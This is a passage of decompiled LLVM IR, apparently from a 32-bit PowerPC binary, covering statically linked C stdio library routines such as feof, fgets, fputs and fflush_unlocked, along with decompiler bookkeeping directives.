  store i32 %v2_1000df1c, i32* %r9.global-to-local, align 4
  store i32 %v2_1000df1c, i32* %v1_1000df10, align 4
  br label %dec_label_pc_1000df24

dec_label_pc_1000df24:                            ; preds = %dec_label_pc_1000df00, %dec_label_pc_1000df0c
  %v0_1000df24 = load i32, i32* @r28, align 4
  %v1_1000df24 = add i32 %v0_1000df24, 28
  %v2_1000df24 = inttoptr i32 %v1_1000df24 to i32*
  %v3_1000df24 = load i32, i32* %v2_1000df24, align 4
  store i32 %v3_1000df24, i32* %r9.global-to-local, align 4
  %v1_1000df28 = add i32 %v3_1000df24, 2
  br label %dec_label_pc_1000df34

dec_label_pc_1000df34:                            ; preds = %dec_label_pc_1000da98, %dec_label_pc_1000db6c, %dec_label_pc_1000dc48, %dec_label_pc_1000dc3c, %dec_label_pc_1000dc64, %dec_label_pc_1000dba0, %dec_label_pc_1000de40, %dec_label_pc_1000dcf0, %dec_label_pc_1000dde4, %dec_label_pc_1000df24
  %storemerge2 = phi i32 [ %v1_1000df28, %dec_label_pc_1000df24 ], [ -1, %dec_label_pc_1000dde4 ], [ -1, %dec_label_pc_1000dcf0 ], [ -1, %dec_label_pc_1000de40 ], [ -1, %dec_label_pc_1000dba0 ], [ -1, %dec_label_pc_1000dc64 ], [ -1, %dec_label_pc_1000dc3c ], [ -1, %dec_label_pc_1000dc48 ], [ -1, %dec_label_pc_1000db6c ], [ -1, %dec_label_pc_1000da98 ]
  store i32 %storemerge2, i32* %r3.global-to-local, align 4
  store i32 %v0_1000da30, i32* %r0.global-to-local, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i32 %v1_1000df18, { 1, 0 }
  uselistorder i32 %v0_1000def0, { 1, 0 }
  uselistorder i32 %v1_1000dec4, { 1, 2, 0 }
  uselistorder i32 %v1_1000deac, { 1, 0 }
  uselistorder i32 %v0_1000de98, { 0, 2, 1 }
  uselistorder i32 %v3_1000de68, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1000de64, { 1, 2, 0 }
  uselistorder i32 %v1_1000de58, { 1, 2, 0, 3 }
  uselistorder i32 %v1_1000de50, { 1, 0 }
  uselistorder i32 %v0_1000de50, { 1, 2, 0 }
  uselistorder i32 %v3_1000de18, { 1, 0, 2 }
  uselistorder i32 %v1_1000de10, { 1, 0 }
  uselistorder i32 %v0_1000de30, { 1, 2, 0, 3 }
  uselistorder i32 %v1_1000dd88, { 1, 2, 0 }
  uselistorder i32 %v1_1000dd60, { 2, 1, 0 }
  uselistorder i32 %v1_1000dd4c, { 0, 2, 3, 1 }
  uselistorder i32 %v1_1000dd30, { 1, 0, 2 }
  uselistorder i32 %v1_1000dcfc, { 2, 3, 1, 0 }
  uselistorder i32 %v1_1000dcb8, { 0, 2, 3, 1 }
  uselistorder i32 %v0_1000dc7c, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1000dc68, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_1000dbd8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1000dbd4, { 1, 0 }
  uselistorder i32 %v0_1000dbec, { 1, 2, 4, 3, 5, 0 }
  uselistorder i32 %stack_var_-84.2, { 1, 0 }
  uselistorder i32 %v0_1000db50, { 0, 1, 6, 4, 3, 5, 2, 7 }
  uselistorder i32 %v2_1000db48, { 1, 0 }
  uselistorder i32 %v1_1000db38, { 1, 0 }
  uselistorder i32 %v3_1000db30, { 1, 0, 2 }
  uselistorder i32 %v0_1000dbac, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_1000db7c, { 0, 1, 3, 2, 4, 5, 6, 7, 9, 8 }
  uselistorder i32 %v0_1000db0c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1000daf4, { 1, 0 }
  uselistorder i32 %v2_1000dae8.pre-phi, { 0, 4, 1, 3, 2 }
  uselistorder i32 %v1_1000dac8, { 1, 0 }
  uselistorder i32 %v1_1000dab0, { 1, 2, 0 }
  uselistorder i32 %v0_1000daa4, { 2, 1, 0 }
  uselistorder i32* %stack_var_-104, { 2, 0, 1 }
  uselistorder i32* %stack_var_-96, { 2, 0, 1 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder i32* %r6.global-to-local, { 2, 3, 0, 4, 1, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 3, 2, 0, 4, 5, 6, 7, 8, 9, 1 }
  uselistorder i32* %r10.global-to-local, { 0, 1, 2, 3, 5, 6, 7, 11, 4, 12, 8, 9, 10 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 15, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45 }
  uselistorder i32 (i32)* @_promoted_size, { 1, 0 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_10016bc4.608 to i32), { 3, 0, 1, 2 }
  uselistorder i32 ptrtoint ([9 x i8]* @global_var_10016b84.607 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i8 36, { 1, 0 }
  uselistorder i8 37, { 0, 3, 4, 2, 5, 1, 6, 7 }
  uselistorder i32* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000df34, { 9, 6, 8, 7, 4, 2, 3, 5, 1, 0 }
  uselistorder label %dec_label_pc_1000df24, { 1, 0 }
  uselistorder label %dec_label_pc_1000def0, { 1, 0 }
  uselistorder label %dec_label_pc_1000dec0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000de4c, { 1, 0 }
  uselistorder label %dec_label_pc_1000de38, { 1, 0 }
  uselistorder label %dec_label_pc_1000ddfc, { 1, 0 }
  uselistorder label %dec_label_pc_1000dd44, { 1, 0 }
  uselistorder label %dec_label_pc_1000dcf0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000dca0, { 1, 0 }
  uselistorder label %dec_label_pc_1000dc74, { 1, 0 }
  uselistorder label %dec_label_pc_1000dc28, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000dc24, { 1, 0 }
  uselistorder label %dec_label_pc_1000db98, { 1, 0 }
  uselistorder label %dec_label_pc_1000db90, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000db30, { 1, 0 }
  uselistorder label %dec_label_pc_1000db2c, { 1, 0 }
  uselistorder label %dec_label_pc_1000db18, { 1, 0 }
  uselistorder label %dec_label_pc_1000daf8, { 1, 0 }
  uselistorder label %dec_label_pc_1000daf4, { 1, 0 }
  uselistorder label %dec_label_pc_1000dad8, { 1, 0 }
}

define i32 @feof(i32 %arg1) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_1000df50 = call i32 @__asm_mfcr()
  store i32 %v0_1000df50, i32* %r31.global-to-local, align 4
  %v2_1000df74 = add i32 %v0_1000df50, 52
  %v3_1000df74 = inttoptr i32 %v2_1000df74 to i32*
  %v4_1000df74 = load i32, i32* %v3_1000df74, align 4
  %v2_1000df78 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000df78, i32* @r3, align 4
  %v3_1000df7c = icmp eq i32 %v4_1000df74, 0
  store i1 %v3_1000df7c, i1* %cr4_eq.global-to-local, align 1
  br i1 %v3_1000df7c, label %dec_label_pc_1000df90, label %dec_label_pc_1000df90.thread

dec_label_pc_1000df90.thread:                     ; preds = %entry
  %v1_1000df983 = inttoptr i32 %v0_1000df50 to i16*
  %v2_1000df984 = load i16, i16* %v1_1000df983, align 2
  %v3_1000df985 = zext i16 %v2_1000df984 to i32
  store i32 %v3_1000df985, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000dfa4

dec_label_pc_1000df90:                            ; preds = %entry
  %v0_1000df84 = call i32 @__pthread_return_void()
  %v0_1000df8c = call i32 @__pthread_return_0()
  %v0_1000df98.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_1000df9c.pre = load i1, i1* %cr4_eq.global-to-local, align 1
  store i32 %v2_1000df78, i32* @r3, align 4
  %v1_1000df98 = inttoptr i32 %v0_1000df98.pre to i16*
  %v2_1000df98 = load i16, i16* %v1_1000df98, align 2
  %v3_1000df98 = zext i16 %v2_1000df98 to i32
  store i32 %v3_1000df98, i32* %r31.global-to-local, align 4
  br i1 %v0_1000df9c.pre, label %dec_label_pc_1000dfa0, label %dec_label_pc_1000dfa4

dec_label_pc_1000dfa0:                            ; preds = %dec_label_pc_1000df90
  %v0_1000dfa0 = call i32 @__pthread_return_void()
  br label %dec_label_pc_1000dfa4

dec_label_pc_1000dfa4:                            ; preds = %dec_label_pc_1000df90.thread, %dec_label_pc_1000df90, %dec_label_pc_1000dfa0
  %v3_1000df986 = phi i32 [ %v3_1000df985, %dec_label_pc_1000df90.thread ], [ %v3_1000df98, %dec_label_pc_1000df90 ], [ %v3_1000df98, %dec_label_pc_1000dfa0 ]
  %v1_1000dfa8 = call i32 @__asm_rlwinm(i32 %v3_1000df986, i32 0, i32 29, i32 29)
  %v1_1000dfb8 = call %0 @__asm_mtcrf(i32 8, i32 %v0_1000df50)
  %v9_1000dfb8 = extractvalue %0 %v1_1000dfb8, 7
  store i4 %v9_1000dfb8, i4* @cr4, align 1
  ret i32 %v1_1000dfa8

; uselistorder directives
  uselistorder i32 %v0_1000df50, { 3, 0, 1, 2 }
  uselistorder i32* %r31.global-to-local, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_1000dfa4, { 2, 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r28.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_1000dfcc = call i32 @__asm_mfcr()
  store i32 %arg2, i32* %r30.global-to-local, align 4
  store i32 %arg3, i32* %r31.global-to-local, align 4
  store i32 %v0_1000dfcc, i32* %r28.global-to-local, align 4
  %v1_1000dff0 = add i32 %arg3, 52
  %v2_1000dff0 = inttoptr i32 %v1_1000dff0 to i32*
  %v3_1000dff0 = load i32, i32* %v2_1000dff0, align 4
  %v2_1000dff4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000dff4, i32* @r3, align 4
  %v3_1000e000 = icmp eq i32 %v3_1000dff0, 0
  store i1 %v3_1000e000, i1* %cr4_eq.global-to-local, align 1
  br i1 %v3_1000e000, label %dec_label_pc_1000e008, label %dec_label_pc_1000e014

dec_label_pc_1000e008:                            ; preds = %entry
  %v0_1000e008 = call i32 @__pthread_return_void()
  %v0_1000e010 = call i32 @__pthread_return_0()
  %v0_1000e014.pre = load i32, i32* %r30.global-to-local, align 4
  %v0_1000e018.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_1000e01c.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1000e014

dec_label_pc_1000e014:                            ; preds = %entry, %dec_label_pc_1000e008
  %v0_1000e01c = phi i32 [ %v0_1000dfcc, %entry ], [ %v0_1000e01c.pre, %dec_label_pc_1000e008 ]
  %v0_1000e018 = phi i32 [ %arg3, %entry ], [ %v0_1000e018.pre, %dec_label_pc_1000e008 ]
  %v0_1000e014 = phi i32 [ %arg2, %entry ], [ %v0_1000e014.pre, %dec_label_pc_1000e008 ]
  store i32 268492836, i32* @lr, align 4
  %v3_1000e020 = inttoptr i32 %v0_1000e01c to i8*
  %v4_1000e020 = call i32 @__GI_fgets_unlocked(i8* %v3_1000e020, i32 %v0_1000e014, i32 %v0_1000e018)
  store i32 %v4_1000e020, i32* @r31, align 4
  store i32 %v2_1000dff4, i32* @r3, align 4
  %v0_1000e030 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_1000e030, label %dec_label_pc_1000e034, label %dec_label_pc_1000e038

dec_label_pc_1000e034:                            ; preds = %dec_label_pc_1000e014
  %v0_1000e034 = call i32 @__pthread_return_void()
  %v0_1000e03c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000e038

dec_label_pc_1000e038:                            ; preds = %dec_label_pc_1000e014, %dec_label_pc_1000e034
  %v0_1000e03c = phi i32 [ %v4_1000e020, %dec_label_pc_1000e014 ], [ %v0_1000e03c.pre, %dec_label_pc_1000e034 ]
  %v1_1000e04c = call %0 @__asm_mtcrf(i32 8, i32 %v0_1000dfcc)
  %v9_1000e04c = extractvalue %0 %v1_1000e04c, 7
  store i4 %v9_1000e04c, i4* @cr4, align 1
  ret i32 %v0_1000e03c

; uselistorder directives
  uselistorder i32 %v0_1000dfcc, { 1, 0, 2 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000e038, { 1, 0 }
  uselistorder label %dec_label_pc_1000e014, { 1, 0 }
}

define i32 @__GI_fputs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r29.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_1000e060 = call i32 @__asm_mfcr()
  store i32 %arg2, i32* %r31.global-to-local, align 4
  store i32 %v0_1000e060, i32* %r29.global-to-local, align 4
  %v2_1000e080 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000e080, i32* @r3, align 4
  %v1_1000e084 = add i32 %arg2, 52
  %v2_1000e084 = inttoptr i32 %v1_1000e084 to i32*
  %v3_1000e084 = load i32, i32* %v2_1000e084, align 4
  %v3_1000e090 = icmp eq i32 %v3_1000e084, 0
  store i1 %v3_1000e090, i1* %cr4_eq.global-to-local, align 1
  br i1 %v3_1000e090, label %dec_label_pc_1000e098, label %dec_label_pc_1000e0a4

dec_label_pc_1000e098:                            ; preds = %entry
  %v0_1000e098 = call i32 @__pthread_return_void()
  %v0_1000e0a0 = call i32 @__pthread_return_0()
  %v0_1000e0a4.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_1000e0a8.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000e0a4

dec_label_pc_1000e0a4:                            ; preds = %entry, %dec_label_pc_1000e098
  %v0_1000e0a8 = phi i32 [ %v0_1000e060, %entry ], [ %v0_1000e0a8.pre, %dec_label_pc_1000e098 ]
  %v0_1000e0a4 = phi i32 [ %arg2, %entry ], [ %v0_1000e0a4.pre, %dec_label_pc_1000e098 ]
  store i32 268492976, i32* @lr, align 4
  %v2_1000e0ac = call i32 @__GI_fputs_unlocked(i32 %v0_1000e0a8, i32 %v0_1000e0a4)
  store i32 %v2_1000e0ac, i32* %r31.global-to-local, align 4
  store i32 %v2_1000e080, i32* @r3, align 4
  %v0_1000e0bc = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_1000e0bc, label %dec_label_pc_1000e0c0, label %dec_label_pc_1000e0c4

dec_label_pc_1000e0c0:                            ; preds = %dec_label_pc_1000e0a4
  %v0_1000e0c0 = call i32 @__pthread_return_void()
  %v0_1000e0c8.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000e0c4

dec_label_pc_1000e0c4:                            ; preds = %dec_label_pc_1000e0a4, %dec_label_pc_1000e0c0
  %v0_1000e0c8 = phi i32 [ %v2_1000e0ac, %dec_label_pc_1000e0a4 ], [ %v0_1000e0c8.pre, %dec_label_pc_1000e0c0 ]
  %v1_1000e0d8 = call %0 @__asm_mtcrf(i32 8, i32 %v0_1000e060)
  %v9_1000e0d8 = extractvalue %0 %v1_1000e0d8, 7
  store i4 %v9_1000e0d8, i4* @cr4, align 1
  ret i32 %v0_1000e0c8

; uselistorder directives
  uselistorder i32 %v0_1000e060, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000e0c4, { 1, 0 }
  uselistorder label %dec_label_pc_1000e0a4, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10010ad0.584 to i32), i32* @r31, align 4
  store i32 ptrtoint (i32* @global_var_10028258.585 to i32), i32* @r29, align 4
  %v2_1000e108 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1000e108, i32* @r3, align 4
  %v0_1000e110 = call i32 @__pthread_return_void()
  %v0_1000e118 = call i32 @__pthread_return_0()
  %v3_1000e120 = load i32, i32* @global_var_100285e8.586, align 4
  %v3_1000e124 = icmp eq i32 %v3_1000e120, 1
  br i1 %v3_1000e124, label %dec_label_pc_1000e12c, label %dec_label_pc_1000e1d4

dec_label_pc_1000e12c:                            ; preds = %entry
  %v3_1000e130 = load i32, i32* @global_var_100285ec.587, align 4
  %tmp7 = icmp slt i32 %v3_1000e130, 1
  br i1 %tmp7, label %dec_label_pc_1000e1d4, label %dec_label_pc_1000e13c

dec_label_pc_1000e13c:                            ; preds = %dec_label_pc_1000e12c
  %v2_1000e148 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000e148, i32* @r3, align 4
  store i32 0, i32* @r30, align 4
  %v0_1000e154 = call i32 @__pthread_return_void()
  %v0_1000e15c = call i32 @__pthread_return_0()
  %storemerge8 = load i32, i32* bitcast (i32** @global_var_10028598.592 to i32*), align 4
  store i32 %storemerge8, i32* @r29, align 4
  %v3_1000e1b411 = icmp eq i32 %storemerge8, 0
  %v0_1000e1b812 = load i32, i32* @r30, align 4
  br i1 %v3_1000e1b411, label %dec_label_pc_1000e1c0, label %dec_label_pc_1000e16c

dec_label_pc_1000e16c:                            ; preds = %dec_label_pc_1000e13c, %dec_label_pc_1000e1b4.backedge
  %v0_1000e1b817 = phi i32 [ %v0_1000e1b8, %dec_label_pc_1000e1b4.backedge ], [ %v0_1000e1b812, %dec_label_pc_1000e13c ]
  %v3_1000e1b818.in = phi i32 [ %v0_1000e1b8, %dec_label_pc_1000e1b4.backedge ], [ %v0_1000e1b812, %dec_label_pc_1000e13c ]
  %storemerge16 = phi i32 [ %storemerge, %dec_label_pc_1000e1b4.backedge ], [ %storemerge8, %dec_label_pc_1000e13c ]
  %v1_1000e16c = inttoptr i32 %storemerge16 to i16*
  %v2_1000e16c = load i16, i16* %v1_1000e16c, align 2
  %v1_1000e170 = add i32 %storemerge16, 32
  %v2_1000e170 = inttoptr i32 %v1_1000e170 to i32*
  %v3_1000e170 = load i32, i32* %v2_1000e170, align 4
  store i32 %v3_1000e170, i32* @r31, align 4
  %v1_1000e174 = and i16 %v2_1000e16c, -32720
  %v3_1000e178 = icmp eq i16 %v1_1000e174, 48
  br i1 %v3_1000e178, label %dec_label_pc_1000e188, label %dec_label_pc_1000e180

dec_label_pc_1000e180:                            ; preds = %dec_label_pc_1000e16c
  store i32 %storemerge16, i32* @r30, align 4
  br label %dec_label_pc_1000e1b4.backedge

dec_label_pc_1000e188:                            ; preds = %dec_label_pc_1000e16c
  %v3_1000e1b818 = icmp eq i32 %v3_1000e1b818.in, 0
  br i1 %v3_1000e1b818, label %dec_label_pc_1000e18c, label %dec_label_pc_1000e198

dec_label_pc_1000e18c:                            ; preds = %dec_label_pc_1000e188
  store i32 %v3_1000e170, i32* bitcast (i32** @global_var_10028598.592 to i32*), align 4
  br label %dec_label_pc_1000e19c

dec_label_pc_1000e198:                            ; preds = %dec_label_pc_1000e188
  %v2_1000e198 = add i32 %v0_1000e1b817, 32
  %v3_1000e198 = inttoptr i32 %v2_1000e198 to i32*
  store i32 %v3_1000e170, i32* %v3_1000e198, align 4
  %v0_1000e19c.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000e19c

dec_label_pc_1000e19c:                            ; preds = %dec_label_pc_1000e18c, %dec_label_pc_1000e198
  %v0_1000e19c = phi i32 [ %storemerge16, %dec_label_pc_1000e18c ], [ %v0_1000e19c.pre, %dec_label_pc_1000e198 ]
  %v1_1000e19c = inttoptr i32 %v0_1000e19c to i16*
  %v2_1000e19c = load i16, i16* %v1_1000e19c, align 2
  store i32 %v0_1000e19c, i32* @r3, align 4
  %v1_1000e1a4 = and i16 %v2_1000e19c, 8192
  %v3_1000e1a4 = icmp eq i16 %v1_1000e1a4, 0
  br i1 %v3_1000e1a4, label %dec_label_pc_1000e1b4.backedge, label %dec_label_pc_1000e1ac

dec_label_pc_1000e1b4.backedge:                   ; preds = %dec_label_pc_1000e19c, %dec_label_pc_1000e180, %dec_label_pc_1000e1ac
  %storemerge = load i32, i32* @r31, align 4
  store i32 %storemerge, i32* @r29, align 4
  %v3_1000e1b4 = icmp eq i32 %storemerge, 0
  %v0_1000e1b8 = load i32, i32* @r30, align 4
  br i1 %v3_1000e1b4, label %dec_label_pc_1000e1c0, label %dec_label_pc_1000e16c

dec_label_pc_1000e1ac:                            ; preds = %dec_label_pc_1000e19c
  store i32 268493232, i32* @lr, align 4
  %v0_1000e1ac = call i32 @free()
  br label %dec_label_pc_1000e1b4.backedge

dec_label_pc_1000e1c0:                            ; preds = %dec_label_pc_1000e1b4.backedge, %dec_label_pc_1000e13c
  store i32 %v2_1000e148, i32* @r3, align 4
  %v0_1000e1c8 = call i32 @__pthread_return_void()
  %v0_1000e1d0 = load i32, i32* @r29, align 4
  store i32 %v0_1000e1d0, i32* @global_var_100285ec.587, align 4
  %v3_1000e1dc.pre = load i32, i32* @global_var_100285e8.586, align 4
  br label %dec_label_pc_1000e1d4

dec_label_pc_1000e1d4:                            ; preds = %entry, %dec_label_pc_1000e12c, %dec_label_pc_1000e1c0
  %v3_1000e1dc = phi i32 [ %v3_1000e120, %entry ], [ 1, %dec_label_pc_1000e12c ], [ %v3_1000e1dc.pre, %dec_label_pc_1000e1c0 ]
  store i32 %v2_1000e108, i32* @r3, align 4
  %v1_1000e1e4 = add i32 %v3_1000e1dc, -1
  store i32 %v1_1000e1e4, i32* @global_var_100285e8.586, align 4
  %v0_1000e1ec = call i32 @__pthread_return_void()
  ret i32 %v0_1000e1ec

; uselistorder directives
  uselistorder i32 %v0_1000e1b8, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_1000e19c, { 1, 0 }
  uselistorder i32 %v3_1000e170, { 1, 0, 2 }
  uselistorder i32 %storemerge16, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_1000e1d4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000e1b4.backedge, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000e19c, { 1, 0 }
  uselistorder label %dec_label_pc_1000e16c, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 ptrtoint (i32** @global_var_10028598.592 to i32), i32* %r9.global-to-local, align 4
  %v5_1000e214 = icmp eq i16* %arg1, bitcast (i32** @global_var_10028598.592 to i16*)
  store i32 %tmp, i32* @r29, align 4
  store i32 0, i32* @r27, align 4
  br i1 %v5_1000e214, label %dec_label_pc_1000e238, label %dec_label_pc_1000e22c

dec_label_pc_1000e22c:                            ; preds = %entry
  %v4_1000e22c = icmp eq i16* %arg1, null
  store i32 256, i32* @r27, align 4
  br i1 %v4_1000e22c, label %dec_label_pc_1000e238, label %dec_label_pc_1000e364

dec_label_pc_1000e238:                            ; preds = %dec_label_pc_1000e22c, %entry
  store i32 268500992, i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10010ad0.584 to i32), i32* @r30, align 4
  %v2_1000e244 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000e244, i32* @r3, align 4
  %v0_1000e258 = call i32 @__pthread_return_void()
  %v0_1000e260 = call i32 @__pthread_return_0()
  %v3_1000e268 = load i32, i32* @global_var_100285e8.586, align 4
  store i32 %v2_1000e244, i32* @r3, align 4
  %v1_1000e278 = add i32 %v3_1000e268, 1
  store i32 %v1_1000e278, i32* %r9.global-to-local, align 4
  store i32 %v1_1000e278, i32* @global_var_100285e8.586, align 4
  %v0_1000e284 = call i32 @__pthread_return_void()
  store i32 %v2_1000e244, i32* @r3, align 4
  %v0_1000e294 = call i32 @__pthread_return_void()
  %v0_1000e29c = call i32 @__pthread_return_0()
  store i32 268632064, i32* %r9.global-to-local, align 4
  store i32 %v2_1000e244, i32* @r3, align 4
  %v3_1000e2a8 = load i32, i32* bitcast (i32** @global_var_10028598.592 to i32*), align 4
  store i32 %v3_1000e2a8, i32* @r31, align 4
  store i32 0, i32* @r28, align 4
  %v0_1000e2b4 = call i32 @__pthread_return_void()
  %v0_1000e354.pr = load i32, i32* @r31, align 4
  %v3_1000e3543 = icmp eq i32 %v0_1000e354.pr, 0
  br i1 %v3_1000e3543, label %dec_label_pc_1000e35c, label %dec_label_pc_1000e2bc

dec_label_pc_1000e2bc:                            ; preds = %dec_label_pc_1000e238, %dec_label_pc_1000e350
  %v0_1000e2d8 = phi i32 [ %v3_1000e350, %dec_label_pc_1000e350 ], [ %v0_1000e354.pr, %dec_label_pc_1000e238 ]
  %v1_1000e2bc = inttoptr i32 %v0_1000e2d8 to i16*
  %v2_1000e2bc = load i16, i16* %v1_1000e2bc, align 2
  %v3_1000e2bc = zext i16 %v2_1000e2bc to i32
  %v1_1000e2c0 = and i32 %v3_1000e2bc, 64
  store i32 %v1_1000e2c0, i32* %r9.global-to-local, align 4
  %v3_1000e2c0 = icmp eq i32 %v1_1000e2c0, 0
  br i1 %v3_1000e2c0, label %dec_label_pc_1000e350, label %dec_label_pc_1000e2c8

dec_label_pc_1000e2c8:                            ; preds = %dec_label_pc_1000e2bc
  store i32 268632064, i32* %r9.global-to-local, align 4
  %v3_1000e2cc = load i32, i32* @global_var_1002859c.590, align 4
  %v3_1000e2d0 = icmp eq i32 %v3_1000e2cc, 2
  br i1 %v3_1000e2d0, label %dec_label_pc_1000e2f4, label %dec_label_pc_1000e2d8

dec_label_pc_1000e2d8:                            ; preds = %dec_label_pc_1000e2c8
  store i32 %v2_1000e244, i32* @r3, align 4
  %v0_1000e2e8 = call i32 @__pthread_return_void()
  %v0_1000e2f0 = call i32 @__pthread_return_0()
  %v0_1000e2f4.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000e2f4

dec_label_pc_1000e2f4:                            ; preds = %dec_label_pc_1000e2c8, %dec_label_pc_1000e2d8
  %v0_1000e308 = phi i32 [ %v0_1000e2d8, %dec_label_pc_1000e2c8 ], [ %v0_1000e2f4.pre, %dec_label_pc_1000e2d8 ]
  %v1_1000e2f4 = inttoptr i32 %v0_1000e308 to i16*
  %v2_1000e2f4 = load i16, i16* %v1_1000e2f4, align 2
  %v3_1000e2f4 = zext i16 %v2_1000e2f4 to i32
  %v0_1000e2f8 = load i32, i32* @r27, align 4
  %v2_1000e2f8 = or i32 %v0_1000e2f8, %v3_1000e2f4
  %v1_1000e2fc = and i32 %v2_1000e2f8, 832
  %v1_1000e300 = xor i32 %v1_1000e2fc, 320
  store i32 %v1_1000e300, i32* %r9.global-to-local, align 4
  %v3_1000e300 = icmp eq i32 %v1_1000e300, 0
  br i1 %v3_1000e300, label %dec_label_pc_1000e308, label %dec_label_pc_1000e334

dec_label_pc_1000e308:                            ; preds = %dec_label_pc_1000e2f4
  store i32 %v0_1000e308, i32* @r3, align 4
  store i32 268493584, i32* @lr, align 4
  %v0_1000e30c = call i32 @__stdio_wcommit()
  %v3_1000e310 = icmp eq i32 %v0_1000e30c, 0
  br i1 %v3_1000e310, label %dec_label_pc_1000e320, label %dec_label_pc_1000e318

dec_label_pc_1000e318:                            ; preds = %dec_label_pc_1000e308
  store i32 -1, i32* @r28, align 4
  br label %dec_label_pc_1000e334

dec_label_pc_1000e320:                            ; preds = %dec_label_pc_1000e308
  %v0_1000e320 = load i32, i32* @r31, align 4
  %v1_1000e320 = inttoptr i32 %v0_1000e320 to i16*
  %v2_1000e320 = load i16, i16* %v1_1000e320, align 2
  %v3_1000e320 = zext i16 %v2_1000e320 to i32
  %v1_1000e324 = add i32 %v0_1000e320, 8
  %v2_1000e324 = inttoptr i32 %v1_1000e324 to i32*
  %v3_1000e324 = load i32, i32* %v2_1000e324, align 4
  store i32 %v3_1000e324, i32* %r9.global-to-local, align 4
  %v1_1000e328 = call i32 @__asm_rlwinm(i32 %v3_1000e320, i32 0, i32 26, i32 24)
  %v2_1000e328 = trunc i32 %v1_1000e328 to i16
  %v1_1000e32c = load i32, i32* @r31, align 4
  %v2_1000e32c = add i32 %v1_1000e32c, 28
  %v3_1000e32c = inttoptr i32 %v2_1000e32c to i32*
  store i32 %v3_1000e324, i32* %v3_1000e32c, align 4
  %v3_1000e330 = load i32, i32* @r31, align 4
  %v4_1000e330 = inttoptr i32 %v3_1000e330 to i16*
  store i16 %v2_1000e328, i16* %v4_1000e330, align 2
  br label %dec_label_pc_1000e334

dec_label_pc_1000e334:                            ; preds = %dec_label_pc_1000e2f4, %dec_label_pc_1000e318, %dec_label_pc_1000e320
  store i32 268632064, i32* %r9.global-to-local, align 4
  %v3_1000e338 = load i32, i32* @global_var_1002859c.590, align 4
  %v3_1000e33c = icmp eq i32 %v3_1000e338, 2
  br i1 %v3_1000e33c, label %dec_label_pc_1000e350, label %dec_label_pc_1000e344

dec_label_pc_1000e344:                            ; preds = %dec_label_pc_1000e334
